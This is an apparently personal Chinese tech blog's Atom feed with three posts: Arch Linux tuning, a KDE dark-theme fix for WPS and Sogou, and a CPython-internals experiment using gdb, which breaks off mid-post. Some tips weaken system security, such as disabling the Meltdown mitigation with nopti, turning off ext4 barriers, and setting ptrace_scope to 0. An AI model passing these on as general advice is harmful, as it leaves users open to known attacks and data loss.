<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aloxaf&#39;s blog</title>
  
  <subtitle>Aloxaf的个人博客, 记录一些乱七八糟的东西</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.aloxaf.com/"/>
  <updated>2018-11-19T13:05:43.000Z</updated>
  <id>https://www.aloxaf.com/</id>
  
  <author>
    <name>Aloxaf</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arch Linux 杂七杂八的优化</title>
    <link href="https://www.aloxaf.com/2018/11/arch_optimize/"/>
    <id>https://www.aloxaf.com/2018/11/arch_optimize/</id>
    <published>2018-11-18T14:56:27.000Z</published>
    <updated>2018-11-19T13:05:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>发现无聊时刷 <a href="https://wiki.archlinux.org/" target="_blank" rel="noopener">Arch Wiki</a> 也挺有趣的, 记录一下自己干了啥吧. 毕竟有些配置没法放到 dotfiles 里. 记录一下以后翻起来也方便.</p><a id="more"></a><h1 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h1><h2 id="nopti"><a href="#nopti" class="headerlink" title="nopti"></a>nopti</h2><p>参考: <a href="https://bbs.archlinux.org/viewtopic.php?pid=1759527#p1759527" target="_blank" rel="noopener">Performance degradation after Meltdown mitigation?</a></p><p>打开 <code>/etc/default/grub</code>, 给 <code>GRUB_CMDLINE_LINUX_DEFAULT</code>添加<code>nopti</code>参数, 禁用上次 intel Meltdown 漏洞的补丁. </p><p>这个补丁实测严重影响<strong>系统调用</strong>性能, 大约下降 70%. 虽然实际上应该没啥程序会疯狂 syscall ....但我还是要关掉它!</p><h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><h2 id="SSD"><a href="#SSD" class="headerlink" title="SSD"></a>SSD</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Solid_state_drive" target="_blank" rel="noopener">Solid state drive</a></p><h3 id="TRIM"><a href="#TRIM" class="headerlink" title="TRIM"></a>TRIM</h3><p>通过 <code>hdparm -I /dev/sda | grep TRIM</code> 检验是否支持, 挂载参数添加 <code>discard</code> 以启用.</p><h3 id="调度器"><a href="#调度器" class="headerlink" title="调度器"></a>调度器</h3><p>可以通过 <code>cat /sys/block/sda/queue/scheduler</code>查看当前调度器和可用调度器, 默认应该是 <code>bfq</code>.</p><p>据 wiki 所说, SSD 性能强劲, 因此简单的调度算法反而适合 SSD, 如 <code>noop</code>, <code>deadline</code></p><p>往 <code>/etc/udev/rules.d/60-ioschedulers.rules</code> 里写入如下规则, 为 SSD 启用 <code>mq-deadline</code> 调度器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTION==&quot;add|change&quot;, KERNEL==&quot;sd[a-z]|mmcblk[0-9]*|nvme[0-9]*&quot;, ATTR&#123;queue/rotational&#125;==&quot;0&quot;, ATTR&#123;queue/scheduler&#125;=&quot;mq-deadline&quot;</span><br></pre></td></tr></table></figure><h2 id="Ext4-性能优化"><a href="#Ext4-性能优化" class="headerlink" title="Ext4 性能优化"></a>Ext4 性能优化</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Ext4#Improving_performance" target="_blank" rel="noopener">Ext4#Improving_performance</a></p><h3 id="禁止更新访问时间戳"><a href="#禁止更新访问时间戳" class="headerlink" title="禁止更新访问时间戳"></a>禁止更新访问时间戳</h3><p>想了想我似乎没有需要知道某个文件上次被访问是啥时候的需求, 于是 fstab 添加<code>noatime</code> 参数禁用之.</p><p>如果有这个需求的话, 也可以用 <code>relatime</code>/<code>strictatime</code>搭配<code>lazytime</code>来减小写入硬盘的次数. 虽然系统崩溃时可能导致访问时间未更新, 不过这显然不是什么大事......</p><h3 id="关闭屏障"><a href="#关闭屏障" class="headerlink" title="关闭屏障"></a>关闭屏障</h3><p>虽然没懂到底是什么鬼(保证写入的正确性?), 不过wiki上说有备用电源就可以安全关闭. </p><p>笔记本, 不怕断电, 果断添加参数<code>barrier=0</code>禁用.</p><h3 id="禁用日志"><a href="#禁用日志" class="headerlink" title="禁用日志"></a>禁用日志</h3><p>首先卸载磁盘, 然后 <code>tune2fs -O &quot;^has_journal&quot; /dev/sdXN</code></p><p>以前关掉过, 后来想了想还是打开了...为了我能够安心地强制关机......</p><h3 id="加速日志"><a href="#加速日志" class="headerlink" title="加速日志"></a>加速日志</h3><p>根据这篇文章, 最棒的方法应该是单独使用一个分区作为日志分区然后启用 <code>journal_async_commit</code>:<a href="https://raid6.com.au/posts/fs_ext4_external_journal/" target="_blank" rel="noopener">ext4: using external journal to optimise performance</a>. 速度最多能提升到原来的三倍, 妙啊妙啊!</p><p>Mark 一下, 暂时不打算弄.</p><h2 id="fstab"><a href="#fstab" class="headerlink" title="fstab"></a>fstab</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Fstab" target="_blank" rel="noopener">fstab</a></p><h3 id="使用-LABEL"><a href="#使用-LABEL" class="headerlink" title="使用 LABEL"></a>使用 LABEL</h3><p>fstab 默认使用的是内核名称描述符(eg. /dev/sda1)来指示挂载设备. 这通常问题不大.</p><p>然而当你加了一块硬盘(包括移动硬盘), 就可能会导致描述符的改变, 从而出现无法启动的状况. 到群里问了大佬们, 大佬们有推荐用 UUID, 有推荐用 LABEL 的. 个人感觉 LABEL 比较好懂 (</p><p>创建 LABEL 的方法见: <a href="https://wiki.archlinux.org/index.php/Persistent_block_device_naming#by-label" target="_blank" rel="noopener">Persistent_block_device_naming#by-label</a></p><p>以 ext4 为例, 使用 <code>e2label /dev/XXX &lt;label&gt;</code>创建 LABEL, 然后就可以在 fstab 里使用 <code>LABEL=xxx</code> 的方式来指示挂载设备了, 不用担心因为插拔硬盘导致奇怪的问题.</p><h3 id="自动挂载移动硬盘"><a href="#自动挂载移动硬盘" class="headerlink" title="自动挂载移动硬盘"></a>自动挂载移动硬盘</h3><p>每次手动挂载很麻烦, 直接添加到 fstab 的话没插移动硬盘就会 error, 这时就要使用 <code>nofail</code> 参数, 像这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=backup    /mnt/backup     ext4    defaults,noatime,nofail         0 2</span><br></pre></td></tr></table></figure><p>第一次用貌似会遇到无法写入的问题, 使用 <code>sudo chown -R $USER:$USER /mnt/backup</code> 更改一次所有权就行了</p><h3 id="自动挂载大分区"><a href="#自动挂载大分区" class="headerlink" title="自动挂载大分区"></a>自动挂载大分区</h3><p>因为一直以来都以 Linux 作为主力系统. 然后觉得 ntfs-3g 实在不可靠......于是把原来 NTFS 的资料盘转成 ext4 了.</p><p>不过资料盘用得比较少, 可以用 <code>noauto,x-systemd.automount</code> 参数使得在访问时才挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=storage   /mnt/storage    ext4    defaults,noatime,noauto,x-systemd.automount             0 2</span><br></pre></td></tr></table></figure><p>(第一次用还是需要 chown 好像....)</p><h1 id="pacman"><a href="#pacman" class="headerlink" title="pacman"></a>pacman</h1><p>参考: <a href="https://wiki.archlinux.org/index.php/Pacman" target="_blank" rel="noopener">pacman</a></p><h2 id="pacman-conf"><a href="#pacman-conf" class="headerlink" title="pacman.conf"></a>pacman.conf</h2><p><code># Misc options</code>开启 <code>Color</code> 和 <code>VerbosePkgLists</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Misc options</span></span><br><span class="line"><span class="comment">#UseSyslog</span></span><br><span class="line">Color</span><br><span class="line"><span class="comment">#TotalDownload</span></span><br><span class="line">CheckSpace</span><br><span class="line">VerbosePkgLists</span><br></pre></td></tr></table></figure><p>作用: pacman 彩色输出 &amp;&amp; 升级时使用三栏显示</p><h2 id="自动清理软件包缓存"><a href="#自动清理软件包缓存" class="headerlink" title="自动清理软件包缓存"></a>自动清理软件包缓存</h2><p>创建 <code>/usr/share/libalpm/hooks/clean-cache.hook</code>, 内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Trigger]</span></span><br><span class="line"><span class="attr">Operation</span> = Remove</span><br><span class="line"><span class="attr">Operation</span> = Install</span><br><span class="line"><span class="attr">Operation</span> = Upgrade</span><br><span class="line"><span class="attr">Type</span> = Package</span><br><span class="line"><span class="attr">Target</span> = *</span><br><span class="line"></span><br><span class="line"><span class="section">[Action]</span></span><br><span class="line"><span class="attr">Description</span> = Cleaning up old packages...</span><br><span class="line"><span class="attr">When</span> = PostTransaction</span><br><span class="line"><span class="attr">Exec</span> = /usr/bin/paccache -rvk3</span><br></pre></td></tr></table></figure><p>作用: 每次升级软件包后清理最近三次以前的软件包</p><h1 id="makepkg"><a href="#makepkg" class="headerlink" title="makepkg"></a>makepkg</h1><p>参考: <a href="https://wiki.archlinux.org/index.php/Makepkg" target="_blank" rel="noopener">makepkg</a></p><h2 id="makepkg-conf"><a href="#makepkg-conf" class="headerlink" title=".makepkg.conf"></a>.makepkg.conf</h2><p>新建 <code>~/.makepkg.conf</code>, 写入如下内容pacman</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">CFLAGS</span>=<span class="string">"-march=native -O2 -pipe -fno-plt"</span></span><br><span class="line"><span class="attr">CXXFLAGS</span>=<span class="string">"-march=native -O2 -pipe -fno-plt"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">MAKEFLAGS</span>=<span class="string">"-j$(nproc)"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">BUILDENV</span>=(!distcc color ccache !check !sign)</span><br><span class="line"><span class="attr">BUILDDIR</span>=/tmp/makepkg</span><br><span class="line"></span><br><span class="line"><span class="attr">COMPRESSXZ</span>=(xz -c -z - --threads=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>作用: 优化生成的二进制文件 &amp;&amp;  加快编译速度 &amp;&amp; 加快软件包生成速度</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;发现无聊时刷 &lt;a href=&quot;https://wiki.archlinux.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Arch Wiki&lt;/a&gt; 也挺有趣的, 记录一下自己干了啥吧. 毕竟有些配置没法放到 dotfiles 里. 记录一下以后翻起来也方便.&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>解决 KDE 暗色主题下 WPS &amp; 搜狗拼音设置字体颜色不正常的问题</title>
    <link href="https://www.aloxaf.com/2018/11/kde_dark_theme/"/>
    <id>https://www.aloxaf.com/2018/11/kde_dark_theme/</id>
    <published>2018-11-14T12:58:52.000Z</published>
    <updated>2018-11-14T12:58:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个比较迷的 bug, 困扰了我很久, 然而又不知道为什么.</p><p>今天在群里看到有人提到了这个问题, 简单地讲就是程序只有一部分跟随系统主题, 然后就会产生各种诡异的效果.</p><p>比如</p><ul><li>搜狗, 字体跟随系统变成浅色, 背景没有变, 变成浅色背景+浅色字体, 亮瞎眼组合</li><li>WPS 表格, 表格背景是黑的....究极の难看</li><li>WPS 文字, 字体也变浅色了, 不仅亮瞎眼. 如果强行调成黑色的话, 在 Windows 上就会变亮瞎眼...</li></ul><a id="more"></a><p>记录一下解决方案:</p><p>首先在 设置-应用程序风格-GNOME程序风格 里设置一个亮色主题</p><p>然后修改 <code>/usr/share/applications/wps-office-{wps,wpp,et}.desktop</code> 和 <code>fcitx-ui-sogou-qimpanel.desktop</code> , 给 <code>Exec</code> 项添加参数 <code>-style gtk+</code> </p><p>以 WPS 为例, Before</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Exec</span>=/usr/bin/wps %f</span><br></pre></td></tr></table></figure><p>After</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Exec</span>=/usr/bin/wps -style gtk+ %f</span><br></pre></td></tr></table></figure><p>原理: 把这堆不守规矩的程序踢给 GTK+</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个比较迷的 bug, 困扰了我很久, 然而又不知道为什么.&lt;/p&gt;
&lt;p&gt;今天在群里看到有人提到了这个问题, 简单地讲就是程序只有一部分跟随系统主题, 然后就会产生各种诡异的效果.&lt;/p&gt;
&lt;p&gt;比如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;搜狗, 字体跟随系统变成浅色, 背景没有变, 变成浅色背景+浅色字体, 亮瞎眼组合&lt;/li&gt;
&lt;li&gt;WPS 表格, 表格背景是黑的....究极の难看&lt;/li&gt;
&lt;li&gt;WPS 文字, 字体也变浅色了, 不仅亮瞎眼. 如果强行调成黑色的话, 在 Windows 上就会变亮瞎眼...&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>如何在 Python3 中让 &#39;a&#39; is &#39;b&#39; 为 True</title>
    <link href="https://www.aloxaf.com/2018/10/egg_pain_python/"/>
    <id>https://www.aloxaf.com/2018/10/egg_pain_python/</id>
    <published>2018-10-28T06:24:05.000Z</published>
    <updated>2018-10-28T13:08:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一篇闲蛋疼的文章, 讲述了闲蛋疼的我是如何<del>历经千辛万苦终于</del>在 Python 中让 <code>&#39;a&#39; is &#39;b&#39;</code> 得到 <code>True</code>.</p><p><del>(虽然这件事情毫无意义)</del></p><p><del>(不过拿来坑下一任或许是个好主意呢)</del></p><a id="more"></a><h1 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h1><p>这个想法最早在六月中旬就产生了, 主要是看了知乎上的两个回答, </p><ul><li><a href="https://www.zhihu.com/question/39021759/answer/81901936" target="_blank" rel="noopener">如何用一段简单的代码讲述一个悲伤的故事？</a> </li><li><a href="https://www.zhihu.com/question/27376156/answer/103135969" target="_blank" rel="noopener">Python 有什么奇技淫巧？</a> </li></ul><p>然后我想, 那能不能来个 <code>&#39;God&#39; is &#39;girl&#39; -&gt; True</code> 之类的. </p><p>当时也尝试了一下, xjb读了一下源码, 尝试使用 &#39;a&#39; 的内存覆盖 &#39;b&#39; 的内存, 然而最终只做到了 <code>hash(&#39;a&#39;) == hash(&#39;b&#39;)</code>. </p><p>而且读完 <code>is</code> 的源码后, 觉得这不大可能实现, 于是就放弃了. (因为发现 <code>is</code> 比较的是两个对象的指针, 而不是内容, 所以两个不同的对象进行比较是无论如何都不可能 True 的, 即使 hash 什么的都一模一样)</p><p>四个月后我又回想起了这个问题, 我觉得我应该有能力再次挑战了, 然后果然挑战成功了!</p><p>于是写下这篇文章, 记录一下自己在这个过程中学到的东西. </p><h1 id="先试试常规手段"><a href="#先试试常规手段" class="headerlink" title="先试试常规手段"></a>先试试常规手段</h1><h2 id="1-直接交换"><a href="#1-直接交换" class="headerlink" title="1. 直接交换"></a>1. 直接交换</h2><p><code>False = True</code></p><p>很简单粗暴的想法, 然而 python 的回应也很简单粗暴: 关键字不能赋值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">False</span> = <span class="keyword">True</span></span><br><span class="line">  File <span class="string">"&lt;ipython-input-1-e3c38088f793&gt;"</span>, line <span class="number">1</span></span><br><span class="line">    <span class="keyword">False</span> = <span class="keyword">True</span></span><br><span class="line">                ^</span><br><span class="line">SyntaxError: can<span class="string">'t assign to keyword</span></span><br></pre></td></tr></table></figure><blockquote><p>在 Python2 中, 这行代码其实是可以执行的, 不过这只是改变了字面量 <code>False</code> 的值,  并没有达到我的要求.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; In [<span class="number">1</span>]: <span class="keyword">False</span> = <span class="keyword">True</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; In [<span class="number">2</span>]: <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">&gt; Out[<span class="number">2</span>]: <span class="keyword">False</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; In [<span class="number">3</span>]: <span class="keyword">False</span></span><br><span class="line">&gt; Out[<span class="number">2</span>]: <span class="keyword">True</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="2-globals"><a href="#2-globals" class="headerlink" title="2. globals()"></a>2. <code>globals()</code></h2><p>既然不能直接赋值, 那试试用 <code>globals()</code> 来赋值?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: globals()[<span class="string">'a'</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: globals()[<span class="string">'False'</span>] = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">False</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>仍然失败, 想想也是, 在 Python3 中 <code>False</code> 已经是一个关键字了, 优先级肯定高于变量. 即使有同名变量也会被遮蔽.</p><h2 id="3-重载-eq"><a href="#3-重载-eq" class="headerlink" title="3. 重载 __eq__"></a>3. 重载 <code>__eq__</code></h2><p>想对身为关键字的 <code>True</code> 和 <code>False</code> 做点什么实在是太难了,<br>换个思路试试: 重载 <code>str.__eq__</code>, 让它不管三七二十一全部返回 <code>True</code> ! 妙啊妙啊, 我真是太聪明了. </p><p>虽然不能做到 <code>&#39;a&#39; is &#39;b&#39;</code> 但能实现 <code>&#39;a&#39; == &#39;b&#39;</code> 的话也是一个进步啊.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: int.__eq__ = <span class="keyword">lambda</span> : <span class="keyword">True</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-10</span><span class="number">-71</span>a46054a87d&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 int.__eq__ = lambda : True</span><br><span class="line"></span><br><span class="line">TypeError: can<span class="string">'t set attributes of built-in/extension type '</span>int<span class="string">'</span></span><br></pre></td></tr></table></figure><p>然而又失败了...</p><h2 id="4-重载-repr"><a href="#4-重载-repr" class="headerlink" title="4. 重载 __repr__"></a>4. 重载 <code>__repr__</code></h2><p>不死心的我又想试试 <code>__repr__</code>, 让 <code>bool</code> 对象的 <code>__repr__</code> 始终返回 True</p><p>仍然失败了, 嘛...毕竟是内置类型.</p><p>看来内置的玩意儿通过常规方法是改不了, 那就读源码, 用 ctypes 强行改一波内存.</p><blockquote><p>后来我还想到一种适用于 ipython 的方法, 即自定义一个 ipython formatter, 相当于 ipython 专用的 <code>__repr__</code></p><p>比如我曾经实现过的一个小插件, 可以让一个 bytes 不管是否包含可见字符, 都以十六进制的形式输出<br><a href="https://gist.github.com/Aloxaf/de3de8e7c0b8913335847afd3ff76cc7" target="_blank" rel="noopener">https://gist.github.com/Aloxaf/de3de8e7c0b8913335847afd3ff76cc7</a></p><p>然而还是没有什么卵用...bool类型跟开挂一样无视了 ipython formatter</p><p>这个很奇怪, 不过原因以后再找</p></blockquote><h1 id="还是老老实实读源码吧"><a href="#还是老老实实读源码吧" class="headerlink" title="还是老老实实读源码吧"></a>还是老老实实读源码吧</h1><h2 id="0-搭建调试环境"><a href="#0-搭建调试环境" class="headerlink" title="0. 搭建调试环境"></a>0. 搭建调试环境</h2><p>这几个月熟悉了一下棒棒的 gdb, 这次要利用起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gitee 的唯一用处</span></span><br><span class="line">wget https://gitee.com/Aloxaf/cpython/repository/archive/v3.7.1.zip</span><br><span class="line">unzip v3.7.1.zip</span><br><span class="line"><span class="built_in">cd</span> cpython</span><br><span class="line">./configure --with-pydebug</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>非常迅速地编译完了, 接下来运行 <code>gdb ./python</code>.<br>不出意外的话会提示你给 <code>python-gdb.py</code> 添加一个啥 <code>add-auto-load-safe-path</code> 到 <code>~/.gdbinit</code>, 照它说的添加就行. 可以提升调试体验.<br>(如果你的 gdb 什么插件都没装的话, 建议安装一个 pwndbg, <del>能让你从此爱上 gdb</del>)</p><p>然后运行 <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> 允许 attach 进程</p><p>接着创建一个 Python 文件, 写入如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="number">1</span> == <span class="number">1</span>, <span class="number">1</span> == <span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后 <code>./python test.py&amp;</code> 执行, 记录 pid 并用 <code>gdb ./python $PID</code> attach 到 Python 进程上.</p><p><del>阅读源码我没找到啥好软件(有棒棒的&quot;跳转到定义&quot;的那种), ~~<br>~~我用的 clion, 然而跳转太残废了, 也有可能是我不会配吧 (一般拿 clion 写的是 rust 233</del> </p><p><del>所以我采用了 <code>ripgrep</code> 来搜索定义...然后在 clion 里手动定位....</del></p><p><del>(这个效率太感人了, 如果谁有什么好的方式还望不啬赐教.)</del></p><p>Google了一下这个问题, <a href="https://stackoverflow.com/questions/35297120/viewing-cpython-code-in-clion" target="_blank" rel="noopener">Viewing CPython Code in CLion</a></p><p>只需要创建一个小小的 CMakeLists.txt, 就能使用自动跳转了!!</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make_minimum_required(VERSION <span class="number">3.0</span>)</span><br><span class="line"><span class="keyword">project</span>(cpython)</span><br><span class="line"></span><br><span class="line">file(GLOB SOURCE_FILES</span><br><span class="line">    Python/*.c</span><br><span class="line">    Parser/*.c</span><br><span class="line">    Objects/*.c</span><br><span class="line">    Modules/*.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_directories</span>(<span class="keyword">Include</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(cpython <span class="variable">$&#123;SOURCE_FILES&#125;</span>)</span><br></pre></td></tr></table></figure><h2 id="1-PyObject"><a href="#1-PyObject" class="headerlink" title="1. PyObject *"></a>1. <code>PyObject *</code></h2><p>因为有了先前的经验, 这里直接 <code>b Python/ceval.c:2585</code> 就可以断在 <code>COMPARE_OP</code> 的地方.</p><p>(先前是不断单步走到这儿的...)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────[ SOURCE (CODE) ]─────────────────────────────</span><br><span class="line">   <span class="number">2580</span>         TARGET(COMPARE_OP) &#123;</span><br><span class="line">   <span class="number">2581</span>             PyObject *right = POP();</span><br><span class="line">   <span class="number">2582</span>             PyObject *left = TOP();</span><br><span class="line">   <span class="number">2583</span>             PyObject *res = cmp_outcome(oparg, left, right);</span><br><span class="line">   <span class="number">2584</span>             Py_DECREF(left);</span><br><span class="line"> ► <span class="number">2585</span>             Py_DECREF(right);</span><br><span class="line">   <span class="number">2586</span>             SET_TOP(res);</span><br><span class="line">   <span class="number">2587</span>             <span class="keyword">if</span> (res == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">2588</span>                 <span class="keyword">goto</span> error;</span><br><span class="line">   <span class="number">2589</span>             PREDICT(POP_JUMP_IF_FALSE);</span><br><span class="line">   <span class="number">2590</span>             PREDICT(POP_JUMP_IF_TRUE);</span><br></pre></td></tr></table></figure><p>通过 <code>py-list</code>可以查看当前执行到 .py 文件的哪一行.</p><p><code>p res</code>输出了 <code>$1 = False</code>, res 明明是 <code>PyObject *</code>类型, 却直接输出了内容, 这就是开始那个 <code>python-gdb.py</code> 的作用.</p><p><code>p *res</code> 解引用看一下这个结构体, 发现看不懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  _ob_next = <span class="number">0x7fd80d9afba0</span>, </span><br><span class="line">  _ob_prev = <span class="number">0x7fd80d9afc08</span>, </span><br><span class="line">  ob_refcnt = <span class="number">138</span>, </span><br><span class="line">  ob_type = <span class="number">0x6b2d00</span> &lt;PyBool_Type&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rg &#39;} PyObject&#39;</code> 搜索一下定义, 在 <code>Include/object.h:110</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _PyObject_HEAD_EXTRA            \</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_next</span>;</span>           \</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> *_<span class="title">ob_prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Nothing is actually declared to be a PyObject, but every pointer to</span></span><br><span class="line"><span class="comment"> * a Python object can be cast to a PyObject*.  This is inheritance built</span></span><br><span class="line"><span class="comment"> * by hand.  Similarly every pointer to a variable-size Python object can,</span></span><br><span class="line"><span class="comment"> * in addition, be cast to PyVarObject*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>大概意思就是不管什么对象大家都可以是 <code>PyObject *</code>, Python 内部也以这个指针来传递各种对象, 显得统一. 要取这个对象内容的时候再根据 <code>ob_type</code> 特事特办</p><blockquote><p>第一次调试到这里的时候我没认真看注释,<br>天真地以为通过 <code>memmove(id(True), id(False), sizeof(PyObject))</code> 就能用 True 的内容覆盖掉 False, 事实上 <code>sizeof(PyObject)</code> 根本根本不是 True Object 的真实大小.</p><p>那么, 把 <code>sizeof(PyObject)</code> 改大一点行不行? 其实还是不行, 原因在下面...</p></blockquote><h2 id="2-Py-False-和-Py-FalseStruct"><a href="#2-Py-False-和-Py-FalseStruct" class="headerlink" title="2. Py_False 和 _Py_FalseStruct"></a>2. <code>Py_False</code> 和 <code>_Py_FalseStruct</code></h2><p>那么问题来了, <code>False</code> 